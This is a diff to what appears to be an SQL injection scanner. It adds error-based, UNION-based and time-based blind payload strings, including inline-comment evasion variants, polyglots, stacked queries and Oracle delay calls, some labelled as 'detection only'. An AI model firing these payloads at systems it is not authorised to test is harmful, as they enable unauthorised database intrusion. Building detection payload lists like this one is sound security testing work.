@@ -58,6 +58,21 @@ SQLI_ERROR_PAYLOADS = [
     "') OR ('1'='1",
     "1' AND '1'='1",
     "%27",
+    # stacked queries (detection only, no destructive statements)
+    "'; SELECT 1-- ",
+    "'; SELECT pg_sleep(0)-- ",
+    # inline comments
+    "'/**/OR/**/1=1-- ",
+    "'/**/UNION/**/SELECT/**/1-- ",
+    "1'/**/AND/**/'1'='1",
+    # polyglot payloads (break out of multiple contexts)
+    "'\"--",
+    "')) OR (('1'='1",
+    "')))) OR (((('1'='1",
+    # comment-style terminators
+    "'#",
+    "'/*",
+    "' OR '1'='1'/*",
 ]
 
 # UNION-based detection payloads
@@ -66,6 +81,12 @@ SQLI_UNION_PAYLOADS = [
     "' UNION SELECT 1,2-- ",
     "' UNION SELECT 1,2,3-- ",
     "' UNION ALL SELECT NULL-- ",
+    # inline comment variants
+    "'/**/UNION/**/SELECT/**/1,2-- ",
+    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL-- ",
+    # stacked query variants (detection only)
+    "'; SELECT 1,2-- ",
+    "'; SELECT NULL,NULL,NULL-- ",
 ]
 
 # Time-based blind payloads: (payload, db_label)
@@ -74,6 +95,15 @@ SQLI_TIME_PAYLOADS = [
     ("'; WAITFOR DELAY '0:0:5'-- ", "MSSQL"),
     ("' AND pg_sleep(5)-- ", "PostgreSQL"),
     ("1' AND SLEEP(5)-- ", "MySQL"),
+    # inline comment variants
+    ("'/**/AND/**/SLEEP(5)-- ", "MySQL"),
+    ("'/**/AND/**/pg_sleep(5)-- ", "PostgreSQL"),
+    # Oracle (DBMS_LOCK / UTL_INADDR time delays)
+    ("' AND 1=DBMS_LOCK.SLEEP(5)-- ", "Oracle"),
+    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS('1')-- ", "Oracle"),
+    # stacked query variants
+    ("'; SELECT SLEEP(5)-- ", "MySQL"),
+    ("'; SELECT pg_sleep(5)-- ", "PostgreSQL"),
 ]
 
 
